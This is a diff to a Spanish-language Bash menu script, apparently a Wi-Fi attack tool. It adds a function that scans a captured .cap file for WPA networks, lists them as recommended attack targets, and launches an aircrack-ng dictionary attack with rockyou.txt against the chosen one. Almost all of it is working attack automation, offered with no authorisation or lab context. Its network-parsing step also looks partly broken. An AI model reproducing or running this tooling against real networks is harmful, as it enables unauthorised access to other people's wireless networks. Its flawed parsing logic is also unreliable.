@@ -117,6 +117,50 @@ scan_networks() {
     sleep 2
 }
 
+# Analizar archivo .cap y recomendar redes
+analyze_cap_file() {
+    clear_screen
+    echo -e "${BLUE}[+] Analizando archivo .cap para recomendar redes...${NC}"
+    cap_file=$(find $RESULTS_DIR -type f -name "*.cap" 2>/dev/null | head -n 1)
+
+    if [[ -z "$cap_file" ]]; then
+        echo -e "${RED}[-] No se encontró ningún archivo .cap en la carpeta de resultados.${NC}"
+        return
+    fi
+
+    echo -e "${GREEN}[+] Archivo .cap encontrado: $cap_file${NC}"
+    recommended_networks=$(aircrack-ng $cap_file | grep "WPA" | awk '{print $3, $4, $5}')
+
+    if [[ -z "$recommended_networks" ]]; then
+        echo -e "${RED}[-] No se encontraron redes vulnerables en el archivo .cap.${NC}"
+        return
+    fi
+
+    echo -e "${BLUE}[+] Redes recomendadas para ataque:${NC}"
+    select network in $recommended_networks "Salir"; do
+        if [[ "$network" == "Salir" ]]; then
+            echo -e "${RED}[-] Saliendo del análisis.${NC}"
+            return
+        elif [[ -n "$network" ]]; then
+            echo -e "${GREEN}[+] Red seleccionada para ataque: $network${NC}"
+            perform_attack $network
+            break
+        else
+            echo -e "${RED}[-] Selección inválida. Inténtalo nuevamente.${NC}"
+        fi
+    done
+}
+
+# Realizar ataque contra red seleccionada
+perform_attack() {
+    local network=$1
+    dictionary=$(find_rockyou_dictionary)
+
+    echo -e "${BLUE}[+] Ejecutando ataque contra la red: $network${NC}"
+    xterm -hold -e "aircrack-ng -w $dictionary -b $network $RESULTS_DIR/scan_results*.cap" &
+    sleep 2
+}
+
 # Buscar diccionario rockyou.txt en todo el sistema
 find_rockyou_dictionary() {
     clear_screen
@@ -136,43 +180,6 @@ find_rockyou_dictionary() {
     echo "$dictionary_path"
 }
 
-# Realizar ataque con diccionario actualizado
-dictionary_attack_with_update() {
-    clear_screen
-    echo -e "${BLUE}[+] Preparando ataque con diccionario actualizado.${NC}"
-
-    # Intentar buscar automáticamente el archivo .cap generado
-    cap_file=$(find $RESULTS_DIR -type f -name "*.cap" 2>/dev/null | head -n 1)
-
-    if [[ -z "$cap_file" ]]; then
-        echo -e "${RED}[-] No se encontró ningún archivo .cap automáticamente.${NC}"
-        while true; do
-            echo -e "${YELLOW}[?] Ingresa la ruta al archivo .cap generado:${NC}"
-            read -p "Archivo .cap: " cap_file
-            if [[ -f "$cap_file" ]]; then
-                echo -e "${GREEN}[+] Archivo .cap encontrado: $cap_file${NC}"
-                break
-            else
-                echo -e "${RED}[-] Archivo no encontrado. Inténtalo nuevamente.${NC}"
-            fi
-        done
-    else
-        echo -e "${GREEN}[+] Archivo .cap detectado automáticamente: $cap_file${NC}"
-    fi
-
-    # Buscar o descargar diccionario
-    dictionary=$(find_rockyou_dictionary)
-
-    # Solicitar BSSID
-    echo -e "${YELLOW}[?] Ingresa el BSSID de la red objetivo:${NC}"
-    read -p "BSSID: " bssid
-
-    # Ejecutar ataque con aircrack-ng
-    echo -e "${BLUE}[+] Ejecutando ataque...${NC}"
-    xterm -hold -e "aircrack-ng -w $dictionary -b $bssid $cap_file" &
-    sleep 2
-}
-
 # Menú principal
 main_menu() {
     while true; do
@@ -181,7 +188,7 @@ main_menu() {
         echo -e "${GREEN}1.${NC} Verificar e instalar dependencias"
         echo -e "${GREEN}2.${NC} Habilitar modo monitor"
         echo -e "${GREEN}3.${NC} Escanear redes"
-        echo -e "${GREEN}4.${NC} Realizar ataque con diccionario actualizado"
+        echo -e "${GREEN}4.${NC} Analizar archivo .cap y realizar ataque"
         echo -e "${GREEN}5.${NC} Salir"
         echo -e "${BLUE}[=]=====================================================[=]${NC}"
         read -p "Selecciona una opción: " option
@@ -190,7 +197,7 @@ main_menu() {
             1) install_dependencies ;;
             2) enable_monitor_mode ;;
             3) scan_networks ;;
-            4) dictionary_attack_with_update ;;
+            4) analyze_cap_file ;;
             5) echo -e "${RED}[-] Saliendo...${NC}"; exit 0 ;;
             *) echo -e "${RED}[-] Opción no válida.${NC}"; sleep 2 ;;
         esac
